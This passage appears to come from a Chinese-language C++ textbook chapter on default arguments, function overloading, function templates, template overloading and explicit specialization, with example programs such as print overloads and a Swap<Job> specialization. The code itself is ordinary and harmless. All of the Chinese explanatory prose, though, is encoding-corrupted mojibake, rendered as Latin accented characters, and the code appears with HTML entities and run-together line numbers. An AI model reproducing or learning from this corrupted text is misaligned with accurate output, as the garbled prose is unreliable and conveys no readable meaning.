å‡½æ•°å±•ç¤ºäº†ä¸åŒçš„è°ƒç”¨æ–¹å¼ï¼š ç¬¬ä¸€æ¬¡è°ƒç”¨æä¾›äº†æ‰€æœ‰ä¸‰ä¸ªå‚æ•°ã€‚ ç¬¬äºŒæ¬¡è°ƒç”¨åªæä¾›äº† message å’Œ levelï¼Œprefix ä½¿ç”¨äº†é»˜è®¤å€¼ &quot;Log: &quot;ã€‚ ç¬¬ä¸‰æ¬¡è°ƒç”¨åªæä¾›äº† messageï¼Œlevel ä½¿ç”¨äº†é»˜è®¤å€¼ 1ï¼Œprefix ä½¿ç”¨äº†é»˜è®¤å€¼ &quot;Log: &quot;ã€‚ å‡½æ•°å®šä¹‰éƒ¨åˆ†æ²¡æœ‰é‡å¤é»˜è®¤å€¼ï¼Œåªåˆ—å‡ºäº†å‚æ•°ç±»å‹å’Œåç§°ã€‚ é»˜è®¤å‚æ•°æ˜¯ C++ ä¸­ä¸€ä¸ªæ–¹ä¾¿çš„ç‰¹æ€§ï¼Œå¯ä»¥ä½¿å‡½æ•°æ¥å£æ›´åŠ çµæ´»å’Œæ˜“ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨å¤„ç†å…·æœ‰å¤šä¸ªé…ç½®é€‰é¡¹æˆ–ä¸å¸¸ç”¨å‚æ•°çš„å‡½æ•°æ—¶ã€‚ 8.4 å‡½æ•°é‡è½½å‡½æ•°é‡è½½ (Function Overloading) æ˜¯ C++ çš„ä¸€é¡¹ç‰¹æ€§ï¼Œå…è®¸åœ¨åŒä¸€ä¸ªä½œç”¨åŸŸå†…å®šä¹‰å¤šä¸ªåŒåå‡½æ•°ï¼Œåªè¦å®ƒä»¬çš„å‚æ•°åˆ—è¡¨ï¼ˆä¹Ÿç§°ä¸ºå‡½æ•°ç­¾åï¼‰ä¸åŒå³å¯ã€‚å‚æ•°åˆ—è¡¨çš„ä¸åŒå¯ä»¥ä½“ç°åœ¨å‚æ•°çš„æ•°é‡ã€ç±»å‹æˆ–é¡ºåºä¸Šã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®å‡½æ•°è°ƒç”¨æ—¶æä¾›çš„å®å‚ç±»å‹å’Œæ•°é‡æ¥å†³å®šå…·ä½“è°ƒç”¨å“ªä¸ªé‡è½½ç‰ˆæœ¬ã€‚ å‡½æ•°ç­¾å: å‡½æ•°çš„åç§°å’Œå…¶å‚æ•°åˆ—è¡¨ï¼ˆå‚æ•°çš„ç±»å‹ã€æ•°é‡å’Œé¡ºåºï¼‰å…±åŒæ„æˆäº†å‡½æ•°ç­¾åã€‚æ³¨æ„ï¼šå‡½æ•°çš„è¿”å›ç±»å‹ä¸å±äºå‡½æ•°ç­¾åçš„ä¸€éƒ¨åˆ†ï¼Œä¸èƒ½ä»…å‡­è¿”å›ç±»å‹ä¸åŒæ¥é‡è½½å‡½æ•°ã€‚ ç›®çš„: å…è®¸ä½¿ç”¨ç›¸åŒçš„å‡½æ•°åæ¥æ‰§è¡Œæ¦‚å¿µä¸Šç›¸ä¼¼ä½†æ“ä½œäºä¸åŒæ•°æ®ç±»å‹æˆ–å‚æ•°ç»„åˆçš„ä»»åŠ¡ã€‚ æé«˜ä»£ç çš„å¯è¯»æ€§å’Œæ˜“ç”¨æ€§ï¼Œç”¨æˆ·ä¸å¿…ä¸ºç›¸ä¼¼æ“ä½œè®°ä½å¤šä¸ªä¸åŒçš„å‡½æ•°åã€‚ 8.4.1 é‡è½½ç¤ºä¾‹å‡è®¾æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå‡½æ•°æ¥æ‰“å°ä¸åŒç±»å‹çš„æ•°æ®ã€‚ä½¿ç”¨å‡½æ•°é‡è½½ï¼Œæˆ‘ä»¬å¯ä»¥å®šä¹‰å¤šä¸ªåä¸º print çš„å‡½æ•°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;iostream&gt;#include &lt;string&gt;// é‡è½½ç‰ˆæœ¬ 1: æ‰“å° intvoid print(int i) &#123; std::cout &lt;&lt; &quot;Printing int: &quot; &lt;&lt; i &lt;&lt; std::endl;&#125;// é‡è½½ç‰ˆæœ¬ 2: æ‰“å° doublevoid print(double d) &#123; std::cout &lt;&lt; &quot;Printing double: &quot; &lt;&lt; d &lt;&lt; std::endl;&#125;// é‡è½½ç‰ˆæœ¬ 3: æ‰“å°å­—ç¬¦ä¸² (const char*)void print(const char* s) &#123; std::cout &lt;&lt; &quot;Printing C-string: &quot; &lt;&lt; s &lt;&lt; std::endl;&#125;// é‡è½½ç‰ˆæœ¬ 4: æ‰“å° std::string (å¸¸é‡å¼•ç”¨)void print(const std::string&amp; s) &#123; std::cout &lt;&lt; &quot;Printing std::string: &quot; &lt;&lt; s &lt;&lt; std::endl;&#125;// é‡è½½ç‰ˆæœ¬ 5: æ‰“å°ä¸¤ä¸ª intvoid print(int i, int j) &#123; std::cout &lt;&lt; &quot;Printing two ints: &quot; &lt;&lt; i &lt;&lt; &quot; and &quot; &lt;&lt; j &lt;&lt; std::endl;&#125;// é”™è¯¯ç¤ºä¾‹ï¼šä»…è¿”å›ç±»å‹ä¸åŒï¼Œæ— æ³•é‡è½½// int print(int i) &#123;// std::cout &lt;&lt; &quot;Trying to return int: &quot; &lt;&lt; i &lt;&lt; std::endl;// return i;// &#125;int main() &#123; print(10); // è°ƒç”¨ç‰ˆæœ¬ 1 (int) print(3.14); // è°ƒç”¨ç‰ˆæœ¬ 2 (double) print(&quot;Hello&quot;); // è°ƒç”¨ç‰ˆæœ¬ 3 (const char*) std::string msg = &quot;World&quot;; print(msg); // è°ƒç”¨ç‰ˆæœ¬ 4 (const std::string&amp;) print(5, 20); // è°ƒç”¨ç‰ˆæœ¬ 5 (int, int) // print(10L); // å¯èƒ½äº§ç”Ÿæ­§ä¹‰è°ƒç”¨ï¼Œå› ä¸º long å¯ä»¥è½¬æ¢ä¸º int æˆ– double // ç¼–è¯‘å™¨å¯èƒ½æŠ¥é”™æˆ–é€‰æ‹©ä¸€ä¸ªæœ€ä½³åŒ¹é… return 0;&#125; ä»£ç è§£é‡Š: æˆ‘ä»¬å®šä¹‰äº†äº”ä¸ªåä¸º print çš„å‡½æ•°ï¼Œä½†å®ƒä»¬çš„å‚æ•°åˆ—è¡¨å„ä¸ç›¸åŒï¼ˆç±»å‹æˆ–æ•°é‡ä¸åŒï¼‰ã€‚ åœ¨ main å‡½æ•°ä¸­ï¼Œç¼–è¯‘å™¨æ ¹æ®ä¼ é€’ç»™ print çš„å®å‚ç±»å‹å’Œæ•°é‡ï¼Œè‡ªåŠ¨é€‰æ‹©äº†æ­£ç¡®çš„é‡è½½ç‰ˆæœ¬è¿›è¡Œè°ƒç”¨ã€‚ åç§°ä¿®é¥° (Name Mangling): C++ ç¼–è¯‘å™¨å†…éƒ¨é€šè¿‡ä¸€ç§ç§°ä¸ºåç§°ä¿®é¥°æˆ–åç§°æ”¹ç¼–ï¼ˆName Manglingï¼‰çš„æŠ€æœ¯æ¥åŒºåˆ†åŒåçš„é‡è½½å‡½æ•°ã€‚å®ƒä¼šæ ¹æ®å‡½æ•°çš„ç­¾åï¼ˆåŒ…æ‹¬å‚æ•°ç±»å‹ï¼‰ç”Ÿæˆä¸€ä¸ªå†…éƒ¨å”¯ä¸€çš„åç§°ã€‚ä¾‹å¦‚ï¼Œprint(int) å’Œ print(double) åœ¨ç¼–è¯‘åä¼šå˜æˆä¸åŒçš„å†…éƒ¨åç§°ï¼Œè¿™æ ·é“¾æ¥å™¨å°±èƒ½æ­£ç¡®åœ°å°†å‡½æ•°è°ƒç”¨é“¾æ¥åˆ°å¯¹åº”çš„å‡½æ•°å®šä¹‰ã€‚ 8.4.2 ä½•æ—¶ä½¿ç”¨å‡½æ•°é‡è½½å‡½æ•°é‡è½½æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œä½†åº”è°¨æ…ä½¿ç”¨ï¼Œä»¥ä¿æŒä»£ç çš„æ¸…æ™°æ€§ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›é€‚åˆä½¿ç”¨å‡½æ•°é‡è½½çš„æƒ…å†µï¼š æ‰§è¡Œæ¦‚å¿µä¸Šç›¸ä¼¼çš„ä»»åŠ¡: å½“å¤šä¸ªå‡½æ•°æ‰§è¡Œçš„æ“ä½œé€»è¾‘ä¸Šç›¸ä¼¼ï¼Œåªæ˜¯å¤„ç†çš„æ•°æ®ç±»å‹ä¸åŒæ—¶ï¼ˆå¦‚ä¸Šä¾‹ä¸­çš„ print å‡½æ•°ï¼Œæˆ–è®¡ç®—ä¸åŒç±»å‹æ•°å€¼ç»å¯¹å€¼çš„ abs å‡½æ•°ï¼‰ã€‚ æä¾›ä¸åŒå‚æ•°ç»„åˆ: å½“ä¸€ä¸ªä»»åŠ¡å¯ä»¥é€šè¿‡æä¾›ä¸åŒæ•°é‡æˆ–ç±»å‹çš„å‚æ•°æ¥å®Œæˆæ—¶ï¼ˆä¾‹å¦‚ï¼Œä¸€ä¸ªæ„é€ å‡½æ•°å¯ä»¥æ¥å—ä¸åŒçš„åˆå§‹åŒ–å‚æ•°ç»„åˆï¼‰ã€‚ é¿å…ä½¿ç”¨å‡½æ•°é‡è½½çš„æƒ…å†µ: æ‰§è¡Œå®Œå…¨ä¸åŒçš„ä»»åŠ¡: å¦‚æœå‡½æ•°è™½ç„¶åç§°ç›¸åŒï¼Œä½†æ‰§è¡Œçš„ä»»åŠ¡åœ¨é€»è¾‘ä¸Šæ¯«ä¸ç›¸å…³ï¼Œé‚£ä¹ˆé‡è½½å¯èƒ½ä¼šå¯¼è‡´æ··æ·†ã€‚æ­¤æ—¶åº”ä½¿ç”¨ä¸åŒçš„å‡½æ•°åã€‚ ä»…å‚æ•°ç±»å‹å¯é€šè¿‡é»˜è®¤å‚æ•°æˆ–æ¨¡æ¿å®ç°: å¦‚æœå‡½æ•°çš„åŠŸèƒ½å·®å¼‚å¯ä»¥é€šè¿‡é»˜è®¤å‚æ•°æˆ–å‡½æ•°æ¨¡æ¿ï¼ˆè§ 8.5 èŠ‚ï¼‰æ›´æ¸…æ™°åœ°è¡¨è¾¾ï¼Œé‚£ä¹ˆå¯èƒ½ä¸éœ€è¦é‡è½½ã€‚ä¾‹å¦‚ï¼Œå¦‚æœåªæ˜¯å‚æ•°æ•°é‡ä¸åŒï¼Œä¸”è¾ƒå°‘å‚æ•°çš„ç‰ˆæœ¬å¯ä»¥é€šè¿‡ä¸ºè¾ƒå¤šå‚æ•°ç‰ˆæœ¬æä¾›é»˜è®¤å€¼æ¥å®ç°ï¼Œé‚£ä¹ˆé»˜è®¤å‚æ•°å¯èƒ½æ›´åˆé€‚ã€‚ æ€»ç»“: å‡½æ•°é‡è½½å…è®¸æˆ‘ä»¬ç”¨åŒä¸€ä¸ªåç§°å®šä¹‰å¤šä¸ªåŠŸèƒ½ç›¸ä¼¼ä½†å‚æ•°åˆ—è¡¨ä¸åŒçš„å‡½æ•°ã€‚ç¼–è¯‘å™¨æ ¹æ®è°ƒç”¨æ—¶æä¾›çš„å®å‚æ¥é€‰æ‹©æ­£ç¡®çš„ç‰ˆæœ¬ã€‚è¿™æ˜¯ C++ å®ç°å¤šæ€æ€§çš„ä¸€ç§æ–¹å¼ï¼ˆç¼–è¯‘æ—¶å¤šæ€ï¼‰ï¼Œå¯ä»¥ä½¿ä»£ç æ›´ç›´è§‚ã€æ›´æ˜“ç”¨ï¼Œä½†åº”ç¡®ä¿é‡è½½çš„å‡½æ•°åœ¨é€»è¾‘ä¸Šæ˜¯ç›¸å…³çš„ï¼Œä»¥é¿å…æ··æ·†ã€‚ 8.5 å‡½æ•°æ¨¡æ¿å‡½æ•°é‡è½½å…è®¸æˆ‘ä»¬ä¸ºä¸åŒçš„å‚æ•°ç±»å‹å®šä¹‰åŒåå‡½æ•°ï¼Œä½†å¦‚æœè¿™äº›å‡½æ•°çš„é€»è¾‘å®Œå…¨ç›¸åŒï¼Œåªæ˜¯å¤„ç†çš„æ•°æ®ç±»å‹ä¸åŒï¼Œä¸ºæ¯ç§ç±»å‹éƒ½å†™ä¸€ä¸ªé‡è½½ç‰ˆæœ¬ä¼šå¾ˆç¹çä¸”å®¹æ˜“å‡ºé”™ã€‚ä¾‹å¦‚ï¼Œäº¤æ¢ä¸¤ä¸ª int å’Œäº¤æ¢ä¸¤ä¸ª double çš„é€»è¾‘æ˜¯ä¸€æ ·çš„ã€‚ å‡½æ•°æ¨¡æ¿ (Function Template) æä¾›äº†ä¸€ç§æ›´é€šç”¨çš„è§£å†³æ–¹æ¡ˆã€‚å®ƒå…è®¸æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªä¸ç±»å‹æ— å…³çš„å‡½æ•°å®šä¹‰ï¼Œå…¶ä¸­çš„æ•°æ®ç±»å‹ä½¿ç”¨æ¨¡æ¿å‚æ•°ï¼ˆä¹Ÿå«ç±»å‹å‚æ•°ï¼‰æ¥è¡¨ç¤ºã€‚ç¼–è¯‘å™¨ä¼šæ ¹æ®å‡½æ•°è°ƒç”¨æ—¶ä½¿ç”¨çš„å…·ä½“æ•°æ®ç±»å‹ï¼Œè‡ªåŠ¨ç”Ÿæˆï¼ˆå®ä¾‹åŒ–ï¼‰ç›¸åº”çš„å‡½æ•°ç‰ˆæœ¬ã€‚ ç›®çš„: ç¼–å†™é€šç”¨çš„ã€å¯é‡ç”¨çš„ä»£ç ï¼Œé€‚ç”¨äºå¤šç§æ•°æ®ç±»å‹ã€‚ å‡å°‘ä»£ç é‡å¤ã€‚ æé«˜ä»£ç çš„å¯ç»´æŠ¤æ€§ã€‚ è¯­æ³•: 1234template &lt;typename T&gt; // æˆ–è€… template &lt;class T&gt;return_type function_name(parameter_list) &#123; // å‡½æ•°ä½“ï¼Œå¯ä»¥ä½¿ç”¨ç±»å‹å‚æ•° T&#125; template &lt;typename T&gt;: è¿™æ˜¯æ¨¡æ¿å£°æ˜ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨æ¥ä¸‹æ¥æ˜¯ä¸€ä¸ªæ¨¡æ¿å®šä¹‰ã€‚typename æ˜¯å…³é”®å­—ï¼ˆä¹Ÿå¯ä»¥ç”¨ class å…³é”®å­—ä»£æ›¿ï¼Œä¸¤è€…åœ¨è¿™é‡Œç­‰ä»·ï¼‰ï¼ŒT æ˜¯æ¨¡æ¿å‚æ•°çš„åç§°ï¼ˆé€šå¸¸ç”¨å¤§å†™å­—æ¯ï¼Œå¦‚ T, U, Vï¼Œä½†å¯ä»¥æ˜¯ä»»ä½•åˆæ³•æ ‡è¯†ç¬¦ï¼‰ã€‚ä½ å¯ä»¥å®šä¹‰å¤šä¸ªæ¨¡æ¿å‚æ•°ï¼Œç”¨é€—å·åˆ†éš”ï¼Œä¾‹å¦‚ template &lt;typename T, typename U&gt;ã€‚ return_type, parameter_list, function_name: ä¸æ™®é€šå‡½æ•°å®šä¹‰ç±»ä¼¼ï¼Œä½†å¯ä»¥åœ¨è¿™äº›éƒ¨åˆ†ä½¿ç”¨æ¨¡æ¿å‚æ•° T æ¥ä»£è¡¨æŸç§å¾…å®šçš„æ•°æ®ç±»å‹ã€‚ ç¤ºä¾‹ï¼šé€šç”¨çš„äº¤æ¢å‡½æ•°æ¨¡æ¿ 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;// å®šä¹‰ä¸€ä¸ªå‡½æ•°æ¨¡æ¿ Swaptemplate &lt;typename T&gt; // T ä»£è¡¨ä»»æ„ç±»å‹void Swap(T&amp; a, T&amp; b) &#123; // å‚æ•°æ˜¯ç±»å‹ T çš„å¼•ç”¨ T temp; // å£°æ˜ä¸€ä¸ªç±»å‹ä¸º T çš„ä¸´æ—¶å˜é‡ temp = a; a = b; b = temp;&#125;int main() &#123; int i = 10, j = 20; std::cout &lt;&lt; &quot;Original ints: i = &quot; &lt;&lt; i &lt;&lt; &quot;, j = &quot; &lt;&lt; j &lt;&lt; std::endl; Swap(i, j); // ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆ Swap&lt;int&gt;(int&amp;, int&amp;) ç‰ˆæœ¬ std::cout &lt;&lt; &quot;Swapped ints: i = &quot; &lt;&lt; i &lt;&lt; &quot;, j = &quot; &lt;&lt; j &lt;&lt; std::endl; double x = 1.5, y = 2.8; std::cout &lt;&lt; &quot;\\nOriginal doubles: x = &quot; &lt;&lt; x &lt;&lt; &quot;, y = &quot; &lt;&lt; y &lt;&lt; std::endl; Swap(x, y); // ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆ Swap&lt;double&gt;(double&amp;, double&amp;) ç‰ˆæœ¬ std::cout &lt;&lt; &quot;Swapped doubles: x = &quot; &lt;&lt; x &lt;&lt; &quot;, y = &quot; &lt;&lt; y &lt;&lt; std::endl; char c1 = &#x27;A&#x27;, c2 = &#x27;B&#x27;; std::cout &lt;&lt; &quot;\\nOriginal chars: c1 = &quot; &lt;&lt; c1 &lt;&lt; &quot;, c2 = &quot; &lt;&lt; c2 &lt;&lt; std::endl; Swap(c1, c2); // ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆ Swap&lt;char&gt;(char&amp;, char&amp;) ç‰ˆæœ¬ std::cout &lt;&lt; &quot;Swapped chars: c1 = &quot; &lt;&lt; c1 &lt;&lt; &quot;, c2 = &quot; &lt;&lt; c2 &lt;&lt; std::endl; // Swap(i, x); // é”™è¯¯ï¼ç¼–è¯‘å™¨æ— æ³•æ¨æ–­å‡ºå”¯ä¸€çš„ T ç±»å‹ (int vs double) return 0;&#125; ä»£ç è§£é‡Š: æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªåä¸º Swap çš„å‡½æ•°æ¨¡æ¿ï¼Œå®ƒä½¿ç”¨ç±»å‹å‚æ•° Tã€‚ åœ¨ main å‡½æ•°ä¸­ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ Swap(i, j) æ—¶ï¼Œç¼–è¯‘å™¨çœ‹åˆ°ä¸¤ä¸ªå®å‚éƒ½æ˜¯ int ç±»å‹ï¼Œäºæ˜¯å®ƒæ¨æ–­å‡º T åº”è¯¥æ˜¯ intï¼Œå¹¶è‡ªåŠ¨ç”Ÿæˆï¼ˆå®ä¾‹åŒ–ï¼‰ä¸€ä¸ªä¸“é—¨å¤„ç† int çš„ Swap å‡½æ•°ç‰ˆæœ¬ï¼švoid Swap&lt;int&gt;(int&amp; a, int&amp; b)ã€‚ ç±»ä¼¼åœ°ï¼Œè°ƒç”¨ Swap(x, y) æ—¶ï¼Œç¼–è¯‘å™¨ç”Ÿæˆ Swap&lt;double&gt; ç‰ˆæœ¬ï¼›è°ƒç”¨ Swap(c1, c2) æ—¶ï¼Œç”Ÿæˆ Swap&lt;char&gt; ç‰ˆæœ¬ã€‚ è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º**æ¨¡æ¿å®ä¾‹åŒ– (Template Instantiation)**ã€‚ç¼–è¯‘å™¨åªä¸ºç¨‹åºä¸­å®é™…ç”¨åˆ°çš„ç±»å‹ç”Ÿæˆå‡½æ•°å®ä¾‹ã€‚ 8.5.1 é‡è½½çš„æ¨¡æ¿å‡½æ•°æ¨¡æ¿ä¹Ÿå¯ä»¥åƒæ™®é€šå‡½æ•°ä¸€æ ·è¢«é‡è½½ã€‚ä½ å¯ä»¥æä¾›å¤šä¸ªåŒåçš„å‡½æ•°æ¨¡æ¿ï¼Œåªè¦å®ƒä»¬çš„æ¨¡æ¿å‚æ•°åˆ—è¡¨ä¸åŒï¼Œæˆ–è€…å‡½æ•°å‚æ•°åˆ—è¡¨ï¼ˆéæ¨¡æ¿å‚æ•°éƒ¨åˆ†ï¼‰ä¸åŒå³å¯ã€‚ ç¤ºä¾‹ï¼šé‡è½½æ¨¡æ¿ä»¥å¤„ç†ä¸åŒæ•°é‡çš„å‚æ•°æˆ–ç‰¹å®šç±»å‹ 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;// æ¨¡æ¿ç‰ˆæœ¬ 1: äº¤æ¢ä¸¤ä¸ªåŒç±»å‹å˜é‡template &lt;typename T&gt;void Swap(T&amp; a, T&amp; b) &#123; std::cout &lt;&lt; &quot;Using Swap(T&amp;, T&amp;)&quot; &lt;&lt; std::endl; T temp = a; a = b; b = temp;&#125;// æ¨¡æ¿ç‰ˆæœ¬ 2: äº¤æ¢ä¸¤ä¸ªæ•°ç»„çš„å…ƒç´  (éœ€è¦é¢å¤–å‚æ•°æŒ‡å®šå¤§å°)template &lt;typename T&gt;void Swap(T arr1[], T arr2[], int n) &#123; std::cout &lt;&lt; &quot;Using Swap(T[], T[], int)&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; n; ++i) &#123; T temp = arr1[i]; arr1[i] = arr2[i]; arr2[i] = temp; &#125;&#125;int main() &#123; int i = 10, j = 20; Swap(i, j); // è°ƒç”¨ç‰ˆæœ¬ 1: Swap&lt;int&gt;(int&amp;, int&amp;) int arr_a[] = &#123;1, 2, 3&#125;; int arr_b[] = &#123;4, 5, 6&#125;; int size = 3; std::cout &lt;&lt; &quot;\\nBefore swapping arrays:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_a: &quot; &lt;&lt; arr_a[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[2] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_b: &quot; &lt;&lt; arr_b[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[2] &lt;&lt; std::endl; Swap(arr_a, arr_b, size); // è°ƒç”¨ç‰ˆæœ¬ 2: Swap&lt;int&gt;(int[], int[], int) std::cout &lt;&lt; &quot;\\nAfter swapping arrays:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_a: &quot; &lt;&lt; arr_a[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_a[2] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;arr_b: &quot; &lt;&lt; arr_b[0] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[1] &lt;&lt; &quot; &quot; &lt;&lt; arr_b[2] &lt;&lt; std::endl; return 0;&#125; ç¼–è¯‘å™¨ä¼šæ ¹æ®è°ƒç”¨æ—¶æä¾›çš„å‚æ•°æ•°é‡å’Œç±»å‹ï¼ˆåŒ…æ‹¬æ˜¯å¦æ˜¯æ•°ç»„ï¼‰æ¥é€‰æ‹©æœ€åŒ¹é…çš„é‡è½½æ¨¡æ¿ã€‚ 8.5.2 æ¨¡æ¿çš„å±€é™æ€§å‡½æ•°æ¨¡æ¿æ˜¯é€šç”¨çš„ï¼Œä½†å¹¶éä¸‡èƒ½ã€‚æ¨¡æ¿ä»£ç ä¸­ä½¿ç”¨çš„æ“ä½œï¼ˆå¦‚èµ‹å€¼ =ã€æ¯”è¾ƒ &lt;ã€&gt; ç­‰ï¼‰å¿…é¡»å¯¹å®ä¾‹åŒ–æ—¶ä½¿ç”¨çš„å…·ä½“ç±»å‹æœ‰æ•ˆã€‚å¦‚æœæŸä¸ªç±»å‹ä¸æ”¯æŒæ¨¡æ¿ä»£ç ä¸­çš„æ“ä½œï¼Œé‚£ä¹ˆå®ä¾‹åŒ–è¯¥ç±»å‹çš„æ¨¡æ¿å°±ä¼šå¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚ ç¤ºä¾‹ï¼šæ¨¡æ¿å¯èƒ½å¤±è´¥çš„æƒ…å†µ 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;template &lt;typename T&gt;void CompareAndPrint(const T&amp; a, const T&amp; b) &#123; if (a &lt; b) &#123; // å‡è®¾ç±»å‹ T æ”¯æŒ &lt; è¿ç®—ç¬¦ std::cout &lt;&lt; &quot;a is less than b&quot; &lt;&lt; std::endl; &#125; else if (b &lt; a) &#123; // å‡è®¾ç±»å‹ T æ”¯æŒ &lt; è¿ç®—ç¬¦ std::cout &lt;&lt; &quot;b is less than a&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;a and b are equal (or incomparable)&quot; &lt;&lt; std::endl; &#125;&#125;struct Data &#123; int val; // è¿™ä¸ªç»“æ„ä½“æ²¡æœ‰é‡è½½ &lt; è¿ç®—ç¬¦&#125;;int main() &#123; int x = 5, y = 10; CompareAndPrint(x, y); // OK: int æ”¯æŒ &lt; è¿ç®—ç¬¦ Data d1 = &#123;10&#125;; Data d2 = &#123;20&#125;; // CompareAndPrint(d1, d2); // ç¼–è¯‘é”™è¯¯ï¼Data ç±»å‹æ²¡æœ‰å®šä¹‰ operator&lt; // ç¼–è¯‘å™¨æ— æ³•å®ä¾‹åŒ– CompareAndPrint&lt;Data&gt; return 0;&#125; è¦è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥ä¸º Data ç»“æ„é‡è½½ &lt; è¿ç®—ç¬¦ï¼Œæˆ–è€…ä½¿ç”¨ä¸‹ä¸€èŠ‚å°†ä»‹ç»çš„æ˜¾å¼å…·ä½“åŒ–ã€‚ 8.5.3 æ˜¾å¼å…·ä½“åŒ– (Explicit Specialization)æœ‰æ—¶ï¼Œé€šç”¨çš„å‡½æ•°æ¨¡æ¿å¯¹äºæŸä¸ªç‰¹å®šç±»å‹å¯èƒ½ä¸é€‚ç”¨æˆ–æ•ˆç‡ä¸é«˜ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸ºè¿™ä¸ªç‰¹å®šç±»å‹æä¾›ä¸€ä¸ªä¸“é—¨çš„ã€éæ¨¡æ¿çš„å®ç°ã€‚è¿™å°±æ˜¯æ˜¾å¼å…·ä½“åŒ–ã€‚ è¯­æ³•: 1234template &lt;&gt; // ç©ºçš„å°–æ‹¬å·è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå…·ä½“åŒ–return_type function_name&lt;specific_type&gt;(parameter_list_with_specific_type) &#123; // é’ˆå¯¹ specific_type çš„ç‰¹æ®Šå®ç°&#125; template &lt;&gt;: å‘Šè¯‰ç¼–è¯‘å™¨è¿™æ˜¯ä¸€ä¸ªæ˜¾å¼å…·ä½“åŒ–ã€‚ function_name&lt;specific_type&gt;: åœ¨å‡½æ•°ååæ˜ç¡®æŒ‡å®šè¦ä¸ºå“ªä¸ªç±»å‹æä¾›å…·ä½“åŒ–ç‰ˆæœ¬ã€‚ å‡½æ•°ä½“åŒ…å«é’ˆå¯¹ specific_type çš„ç‰¹æ®Šä»£ç ã€‚ ç¤ºä¾‹ï¼šä¸ºç»“æ„ä½“å…·ä½“åŒ– Swap æ¨¡æ¿ å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªç»“æ„ä½“ï¼Œæˆ‘ä»¬åªæƒ³äº¤æ¢å…¶ä¸­çš„æŸä¸ªæˆå‘˜ï¼Œè€Œä¸æ˜¯æ•´ä¸ªç»“æ„ä½“ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051#include &lt;iostream&gt;struct Job &#123; char name[40]; double salary; int floor;&#125;;// é€šç”¨ Swap æ¨¡æ¿ (åŒä¸Š)template &lt;typename T&gt;void Swap(T&amp; a, T&amp; b) &#123; std::cout &lt;&lt; &quot;(Using generic Swap)&quot; &lt;&lt; std::endl; T temp = a; a = b; b = temp;&#125;// é’ˆå¯¹ Job ç±»å‹çš„æ˜¾å¼å…·ä½“åŒ–template &lt;&gt;void Swap&lt;Job&gt;(Job&amp; j1, Job&amp; j2) &#123; // æ˜ç¡®æŒ‡å®š T ä¸º Job std::cout &lt;&lt; &quot;(Using specialized Swap for Job - swapping salary and floor only)&quot; &lt;&lt; std::endl; // åªäº¤æ¢ salary å’Œ floor æˆå‘˜ double temp_salary = j1.salary; j1.salary = j2.salary; j2.salary = temp_salary; int temp_floor = j1.floor; j1.floor = j2.floor; j2.floor = temp_floor; // name æˆå‘˜ä¿æŒä¸å˜&#125;int main() &#123; int i = 10, j = 20; Swap(i, j); // è°ƒç”¨é€šç”¨æ¨¡æ¿ Swap&lt;int&gt; Job sue = &#123;&quot;Susan Yaffee&quot;, 73000.60, 7&#125;; Job sid = &#123;&quot;Sidney Taffee&quot;, 78060.72, 9&#125;; std::cout &lt;&lt; &quot;\\nOriginal Jobs:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; sue.name &lt;&lt; &quot;: $&quot; &lt;&lt; sue.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sue.floor &lt;&lt; std::endl; std::cout &lt;&lt; sid.name &lt;&lt; &quot;: $&quot; &lt;&lt; sid.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sid.floor &lt;&lt; std::endl; Swap(sue, sid); // è°ƒç”¨æ˜¾å¼å…·ä½“åŒ–ç‰ˆæœ¬ Swap&lt;Job&gt; std::cout &lt;&lt; &quot;\\nSwapped Jobs (partially):&quot; &lt;&lt; std::endl; std::cout &lt;&lt; sue.name &lt;&lt; &quot;: $&quot; &lt;&lt; sue.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sue.floor &lt;&lt; std::endl; std::cout &lt;&lt; sid.name &lt;&lt; &quot;: $&quot; &lt;&lt; sid.salary &lt;&lt; &quot; on floor &quot; &lt;&lt; sid.floor &lt;&lt; std::endl; return 0;&#125; å½“ç¼–è¯‘å™¨é‡åˆ° Swap(sue, sid) è°ƒç”¨æ—¶ï¼Œå®ƒå‘ç°å­˜åœ¨ä¸€ä¸ªä¸“é—¨ä¸º Job ç±»å‹å®šä¹‰çš„æ˜¾å¼å…·ä½“åŒ–ç‰ˆæœ¬ 